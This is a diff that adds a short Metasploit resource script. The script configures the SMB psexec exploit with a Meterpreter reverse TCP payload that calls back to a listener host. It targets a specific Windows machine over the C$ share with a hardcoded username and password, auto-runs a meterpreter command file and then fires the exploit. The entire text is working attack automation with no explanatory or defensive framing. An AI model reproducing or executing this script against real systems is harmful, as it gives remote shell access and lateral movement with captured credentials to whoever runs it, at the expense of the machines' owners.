@@ -1,0 +1,12 @@
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set SHARE C$
+set LHOST 192.168.69.64
+set LPORT 1234
+set RHOSTS 192.168.69.91
+set SMBUser oem
+set SMBPass TDEGpass
+set AutoRunScript multi_console_command -r ./l4dac.meter
+exploit
+quit
+
